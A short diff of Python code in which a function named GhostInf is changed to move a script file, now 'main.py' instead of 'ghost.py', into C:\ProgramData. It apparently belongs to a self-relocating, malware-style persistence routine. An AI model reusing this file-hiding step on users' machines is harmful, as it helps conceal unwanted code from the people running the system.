@@ -23,8 +23,8 @@ def GhostExt(path):
 
 def GhostInf():
     
-    ghostrp = (os.path.join('ghost.py')) 
-    ghostlgm = r'C:\ProgramData\ghost.py'
+    ghostrp = (os.path.join('main.py')) 
+    ghostlgm = r'C:\ProgramData\main.py'
     shutil.move(ghostrp,ghostlgm)
 
     fp = os.path.dirname(os.path.realpath(__file__))
